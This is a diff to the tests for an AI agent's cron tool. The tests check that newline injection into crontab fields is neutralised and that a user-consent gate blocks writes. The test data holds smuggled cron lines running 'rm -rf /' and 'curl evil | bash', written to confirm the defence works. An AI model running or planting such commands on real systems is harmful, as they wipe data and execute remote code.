@@ -8,7 +8,13 @@ import pytest
 from strands import Agent
 
 from strands_tools import cron
-from strands_tools.cron import _sanitize_description
+from strands_tools.cron import _sanitize_cron_line
+
+
+@pytest.fixture(autouse=True)
+def bypass_consent(monkeypatch):
+    """Bypass the consent gate for all tests by default."""
+    monkeypatch.setenv("BYPASS_TOOL_CONSENT", "true")
 
 
 @pytest.fixture
@@ -276,28 +282,28 @@ def test_edit_job_comment_line(mock_subprocess, agent):
     mock_subprocess.Popen.assert_not_called()
 
 
-def test_sanitize_description():
-    """Test description sanitization to prevent crontab injection."""
+def test_sanitize_cron_line():
+    """Test cron line sanitization to prevent newline injection."""
     # Test newline injection
     malicious = "safe comment\n0 * * * * rm -rf /"
-    sanitized = _sanitize_description(malicious)
+    sanitized = _sanitize_cron_line(malicious)
     assert "\n" not in sanitized
     assert sanitized == "safe comment 0 * * * * rm -rf /"
 
     # Test carriage return injection
     malicious = "safe comment\r0 * * * * rm -rf /"
-    sanitized = _sanitize_description(malicious)
+    sanitized = _sanitize_cron_line(malicious)
     assert "\r" not in sanitized
     assert sanitized == "safe comment 0 * * * * rm -rf /"
 
     # Test multiple line breaks
     malicious = "line1\n\nline2\r\nline3"
-    sanitized = _sanitize_description(malicious)
+    sanitized = _sanitize_cron_line(malicious)
     assert sanitized == "line1 line2 line3"
 
-    # Test normal description (no change)
+    # Test normal string (no change)
     normal = "This is a normal description"
-    sanitized = _sanitize_description(normal)
+    sanitized = _sanitize_cron_line(normal)
     assert sanitized == normal
 
 
@@ -320,3 +326,95 @@ def test_add_job_with_malicious_description(mock_subprocess, agent):
     lines = written_content.strip().split("\n")
     assert len(lines) == 1  # Should be only one line
     assert "backup job 0 * * * * rm -rf /" in lines[0]  # Sanitized description
+
+
+@pytest.mark.parametrize(
+    "action_kwargs,existing_crontab",
+    [
+        # add: injection via schedule
+        (
+            {"action": "add", "schedule": "0 9 * * *\n* * * * * curl evil | bash #", "command": "echo report"},
+            "",
+        ),
+        # add: injection via command
+        (
+            {"action": "add", "schedule": "0 9 * * *", "command": "echo safe\n* * * * * curl evil | bash"},
+            "",
+        ),
+        # add: injection via description
+        (
+            {"action": "add", "schedule": "0 9 * * *", "command": "backup.sh", "description": "safe\n* * * * * curl evil | bash"},
+            "",
+        ),
+        # raw: injection via command
+        (
+            {"action": "raw", "command": "0 9 * * * echo safe\n* * * * * curl evil | bash"},
+            "",
+        ),
+        # edit: injection via schedule
+        (
+            {"action": "edit", "job_id": 0, "schedule": "0 3 * * *\n* * * * * curl evil | bash"},
+            "30 5 * * * backup.sh\n",
+        ),
+        # edit: injection via command
+        (
+            {"action": "edit", "job_id": 0, "command": "safe.sh\n* * * * * curl evil | bash"},
+            "30 5 * * * backup.sh\n",
+        ),
+        # edit: injection via description
+        (
+            {"action": "edit", "job_id": 0, "description": "safe\n* * * * * curl evil | bash"},
+            "30 5 * * * backup.sh\n",
+        ),
+    ],
+    ids=[
+        "add-schedule", "add-command", "add-description",
+        "raw-command",
+        "edit-schedule", "edit-command", "edit-description",
+    ],
+)
+def test_newline_injection_produces_single_line(mock_subprocess, agent, action_kwargs, existing_crontab):
+    """Test that newline injection in any field never produces extra crontab lines."""
+    mock_subprocess.run.return_value.stdout = existing_crontab
+
+    result = agent.tool.cron(**action_kwargs)
+
+    result_text = extract_result_text(result)
+    assert "error" not in result_text.lower() or "cancelled" in result_text.lower()
+
+    # Count non-empty lines in the written crontab
+    written_content = mock_subprocess.Popen.return_value.__enter__.return_value.stdin.write.call_args[0][0]
+    lines = [l for l in written_content.strip().split("\n") if l.strip()]
+
+    # Should never have more lines than what existed + 1 new entry
+    existing_lines = [l for l in existing_crontab.strip().split("\n") if l.strip()] if existing_crontab.strip() else []
+    max_expected = len(existing_lines) + 1
+    assert len(lines) <= max_expected
+
+
+def test_consent_denied_blocks_write(mock_subprocess, monkeypatch, agent):
+    """Test that denying consent prevents crontab modification."""
+    monkeypatch.setenv("BYPASS_TOOL_CONSENT", "false")
+    mock_subprocess.run.return_value.stdout = ""
+
+    with patch("strands_tools.cron.get_user_input", return_value="n"), patch("strands_tools.cron.console_util"):
+        result = agent.tool.cron(action="add", schedule="* * * * *", command="echo pwned")
+
+    result_text = extract_result_text(result)
+    assert "cancelled by user" in result_text
+    mock_subprocess.Popen.assert_not_called()
+
+
+def test_consent_granted_allows_write(mock_subprocess, monkeypatch):
+    """Test that granting consent allows crontab modification."""
+    monkeypatch.setenv("BYPASS_TOOL_CONSENT", "false")
+    mock_subprocess.run.return_value.stdout = ""
+
+    agent = Agent(tools=[cron])
+
+    with patch("strands_tools.cron.get_user_input", return_value="y"), patch("strands_tools.cron.console_util"):
+        result = agent.tool.cron(action="add", schedule="0 9 * * *", command="backup.sh")
+
+    result_text = extract_result_text(result)
+    assert "Successfully added new cron job" in result_text
+    mock_subprocess.Popen.assert_called_once()
